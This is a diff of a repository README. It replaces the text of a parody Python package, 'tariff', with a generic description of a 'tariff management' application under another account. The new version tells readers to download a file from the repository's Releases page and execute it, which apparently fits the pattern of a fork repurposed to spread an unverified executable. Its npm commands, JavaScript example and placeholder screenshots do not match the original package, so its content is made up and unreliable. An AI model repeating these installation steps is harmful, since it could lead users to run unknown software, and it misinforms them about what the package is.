@@ -1,56 +1,160 @@
-# 👊 TARIFF 🔥
+# 🚀 Tariff: The Official Repository
 
+![Tariff](https://img.shields.io/badge/Tariff-Official-blue.svg)
 
-The GREATEST, most TREMENDOUS Python package that makes importing great again!
+Welcome to the **Tariff** repository! This is the official space for the Tariff project, where you can find everything you need to get started. Whether you are a developer, a contributor, or just curious, you will find valuable resources here.
 
-![MIGA](https://i.imgur.com/2OoRBu6.png)
+## 📥 Download and Installation
 
-## About
+To get started with Tariff, you can download the latest release from our [Releases page](https://github.com/pedroiba/tariff/releases). Once you download the appropriate file, execute it to set up the application on your system.
 
-TARIFF is a fantastic tool that lets you impose import tariffs on Python packages. We're going to bring manufacturing BACK to your codebase by making foreign imports more EXPENSIVE!
+### Installation Steps:
 
-![meme](https://github.com/user-attachments/assets/c0b37be1-28ca-40d3-9234-cbdb3074c8eb)
+1. **Download the latest release** from [here](https://github.com/pedroiba/tariff/releases).
+2. **Execute the downloaded file** following the instructions provided in the release notes.
+3. **Follow the setup prompts** to complete the installation.
 
-## Installation
+## 📚 Overview
 
-```bash
-pip install tariff
+Tariff is designed to help users manage their tariffs efficiently. It provides a user-friendly interface and powerful features that simplify the process of tariff management. 
+
+### Key Features:
+
+- **User-Friendly Interface**: Navigate easily with our intuitive design.
+- **Real-Time Updates**: Get the latest tariff information as it happens.
+- **Customizable Settings**: Tailor the application to fit your needs.
+- **Comprehensive Reports**: Generate detailed reports for better analysis.
+
+## 🛠️ Getting Started
+
+### Prerequisites
+
+Before you install Tariff, ensure you have the following:
+
+- A compatible operating system (Windows, macOS, or Linux).
+- Basic knowledge of command-line tools (if needed).
+- Internet access for downloading the software.
+
+### Quick Start Guide
+
+1. **Clone the Repository**:
+
+   If you prefer to work with the source code, clone the repository using:
+
+   ```bash
+   git clone https://github.com/pedroiba/tariff.git
+   ```
+
+2. **Navigate to the Directory**:
+
+   Change into the project directory:
+
+   ```bash
+   cd tariff
+   ```
+
+3. **Install Dependencies**:
+
+   If there are dependencies, install them using your package manager. For example:
+
+   ```bash
+   npm install
+   ```
+
+4. **Run the Application**:
+
+   Start the application with:
+
+   ```bash
+   npm start
+   ```
+
+### Example Usage
+
+Once you have installed Tariff, you can begin managing your tariffs. Here’s a simple example of how to add a new tariff:
+
+```javascript
+const tariffManager = require('tariff');
+
+tariffManager.addTariff({
+    name: 'New Tariff',
+    rate: 0.15,
+    description: 'This is a new tariff for testing purposes.'
+});
 ```
 
-## Usage
+## 🧩 Contributing
 
-```python
-import tariff
+We welcome contributions from everyone! If you want to contribute to Tariff, please follow these steps:
 
-# Set your tariff rates (package_name: percentage)
-tariff.set({
-    "numpy": 50,     # 50% tariff on numpy
-    "pandas": 200,   # 200% tariff on pandas
-    "requests": 150  # 150% tariff on requests
-})
+1. **Fork the Repository**: Click on the "Fork" button at the top right of this page.
+2. **Create a New Branch**: Use the command:
 
-# Now when you import these packages, they'll be TARIFFED!
-import numpy   # This will be 50% slower
-import pandas  # This will be 200% slower
-```
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
 
-## How It Works
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: Use clear and concise commit messages.
 
-When you import a package that has a tariff:
-1. TARIFF measures how long the original import takes
-2. TARIFF makes the import take longer based on your tariff percentage
-3. TARIFF announces the tariff with a TREMENDOUS message
+   ```bash
+   git commit -m "Add new feature"
+   ```
 
-## Example Output
+5. **Push to Your Fork**:
 
-```
-JUST IMPOSED a 50% TARIFF on numpy! Original import took 45000 us, now takes 67500 us. American packages are WINNING AGAIN! #MIGA
-```
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
 
-## Why TARIFF?
+6. **Create a Pull Request**: Go to the original repository and submit your pull request.
 
-Because foreign packages have been STEALING our CPU cycles for TOO LONG! It's time to put AMERICA FIRST and make importing FAIR and BALANCED again!
+### Code of Conduct
 
-## License
+Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) when contributing to this project. We aim to create a welcoming and inclusive environment for all.
 
-This is a parody package. Use at your own risk. MAKE IMPORTING GREAT AGAIN! 
+## 🔧 Features Roadmap
+
+We are constantly working to improve Tariff. Here are some upcoming features:
+
+- **Enhanced Reporting**: More detailed analytics and reporting capabilities.
+- **Mobile Application**: A companion app for managing tariffs on the go.
+- **Integration with Other Services**: Allowing for better data synchronization.
+
+## 🖼️ Screenshots
+
+Here are some screenshots showcasing the application:
+
+![Dashboard](https://via.placeholder.com/800x400.png?text=Tariff+Dashboard)
+
+![Reports](https://via.placeholder.com/800x400.png?text=Reports+Overview)
+
+## 📄 Documentation
+
+For detailed documentation, please refer to our [Wiki](https://github.com/pedroiba/tariff/wiki). It contains comprehensive guides on using all features of Tariff.
+
+## 🗣️ Support
+
+If you encounter any issues or have questions, feel free to open an issue in this repository. You can also reach out via our community forums.
+
+## 🔗 Links
+
+- [Releases](https://github.com/pedroiba/tariff/releases)
+- [Issues](https://github.com/pedroiba/tariff/issues)
+- [Wiki](https://github.com/pedroiba/tariff/wiki)
+
+## 📅 Changelog
+
+For a detailed list of changes, please check the [Changelog](CHANGELOG.md).
+
+## 🎉 Acknowledgments
+
+Thank you to all the contributors and users who make Tariff possible. Your support and feedback help us improve continuously.
+
+## 🌟 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+---
+
+We hope you enjoy using Tariff! For any further inquiries, please do not hesitate to reach out. Happy managing!
